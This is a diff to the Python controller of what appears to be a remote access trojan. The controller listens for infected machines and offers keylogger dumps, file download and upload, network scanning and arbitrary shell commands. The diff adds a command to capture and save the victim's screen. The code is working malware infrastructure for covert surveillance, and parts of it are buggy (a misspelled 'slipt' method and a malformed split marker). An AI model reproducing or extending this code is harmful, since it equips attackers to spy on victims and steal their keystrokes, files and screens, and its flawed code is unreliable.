@@ -4,7 +4,7 @@ import socket
 import sys
 import shlex
 import base64
-import readline
+# import readline < importante para funcionar no linux
 
 from pathlib import Path
 from datetime import datetime
@@ -13,6 +13,7 @@ HOST = '0.0.0.0'
 PORT = 4433
 KEYLOGGER_PATH = 'Keylog_dumps'
 DOWLOAD_PATH = 'downloads'
+SCREENSHOT_PATH = 'screenshots'
 
 
 def print_banner():
@@ -45,6 +46,7 @@ KEYLOGGER:
 FILE TRANSFER:
   /dowload '<remote_path>'     - Download file
   /upload '<local_file>' '<remote_path>' - Upload file
+  /screenshot                  - Capture victim screen
 
 SCANNERS:
  /local_scan <192.168.1>       - Scan the local network 
@@ -59,6 +61,25 @@ SHELL COMMANDS:
     Anny other command will be executed as shell command
 """)
 
+def save_screenshot(data):
+    try:
+        if not os.path.exists(SCREENSHOT_PATH):
+            os.makedirs(SCREENSHOT_PATH)
+        
+        file_data = base64.b16decode(data.strip())
+        filename = f'screenshot_{datetime.now().strftime('%Y-%m-%d %H-%M-%S')}.png'
+        
+        filepath = os.path.join(SCREENSHOT_PATH, filename)
+        
+        with open(filepath, 'wb') as f:
+            f.write(file_data)
+        
+        print(f'[+] Screenshot saved: {filepath}')
+        print(f'[i] Size: {len(file_data)} bytes')
+        return True
+    except Exception as e:
+        print(f'\n[-] Error saving screenshot: {e}')
+        return False
 
 def save_dowloaded_file(data, original_filename):
     try:
@@ -155,6 +176,44 @@ def handle_client(conn,addr):
                     print(f'[#] Connected to {addr[0]}:{addr[1]}\n')
                     continue
                 
+                elif command == '/screenshot':
+                    conn.send(b'/screenshot\n')
+                    
+                    buffer = b''
+                    in_file = False
+                    filename = None
+                    
+                    conn.settimeout(15)
+                    
+                    while True:
+                        chunck = conn.recv(4096)
+                        if not chunck:
+                            break
+                        
+                        buffer += chunck
+                        
+                        if b'[FILE_START]' in buffer and not in_file:
+                            in_file = True
+                            parts = buffer.split(b'[FILE_START]')
+                            header = parts[0].decode('utf-8', errors='ignore')
+                            print(header)
+                            
+                            for line in header.split('\n'):
+                                if 'Filename:' in line:
+                                    filename = line.split('Filename:')[1].strip()
+                            
+                            buffer = parts[1]
+                        
+                        if b'[FILE_END]' in buffer:
+                            file_data = buffer.slipt(b'FILE_END')[0]
+                            
+                            if filename:
+                                save_screenshot(file_data.decode('utf-8'))
+                            else:
+                                print('[-] Could not determine filename')
+                            break
+                        continue
+
                 elif command.startswith('/dowload '):
                     try:
                         parts = shlex.split(command)
